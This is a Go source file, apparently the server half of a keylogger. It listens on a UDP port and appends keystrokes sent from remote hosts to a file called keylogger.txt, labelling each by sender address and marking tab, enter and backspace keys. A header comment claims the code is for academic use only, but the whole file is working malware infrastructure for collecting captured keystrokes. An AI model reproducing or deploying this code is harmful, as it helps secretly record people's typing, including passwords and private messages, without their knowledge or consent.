// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

package main

import (
	"fmt"
	"net"
	"os"
)

const (
	Protocol = "udp"
	Address  = "127.0.0.1:8722"
	Filename = "keylogger.txt"
)

func main() {
	laddr, err := net.ResolveUDPAddr(Protocol, Address)
	if err != nil {
		fmt.Printf("Failed to resolve UDP address: %s\n", err.Error())
		return
	}
	conn, err := net.ListenUDP(Protocol, laddr)
	if err != nil {
		fmt.Printf("Failed to listen UDP: %s\n", err.Error())
		return
	}
	defer conn.Close()

	fmt.Println("Start listening...")
	fromHead := true
	for {
		buffer := make([]byte, 1024)
		n, raddr, e := conn.ReadFromUDP(buffer)
		if e != nil {
			fmt.Printf("Failed to read from UDP: %s\n", e.Error())
			continue
		}
		file, e := os.OpenFile(Filename, os.O_WRONLY|os.O_CREATE|os.O_APPEND, os.ModePerm)
		if e != nil {
			fmt.Printf("Failed to open file: %s\n", e.Error())
			fmt.Printf("[%s] %s\n", raddr, bufString(buffer[:n]))
			continue
		}
		if len(bufString(buffer[:n])) == 1 {
			if fromHead {
				_, _ = file.WriteString(fmt.Sprintf("[%s] ", raddr))
			}
			_, _ = file.WriteString(bufString(buffer[:n]))
			fromHead = false
		} else {
			if !fromHead {
				_, _ = file.WriteString("\n")
				fromHead = true
			}
			_, _ = file.WriteString(fmt.Sprintf("[%s] %s\n", raddr, bufString(buffer[:n])))
		}
		_ = file.Close()
	}
}

func bufString(b []byte) string {
	switch string(b) {
	case "\t":
		return "<tab>"
	case "\r":
		return "<enter>"
	case "\b":
		return "<backspace>"
	default:
		return string(b)
	}
}
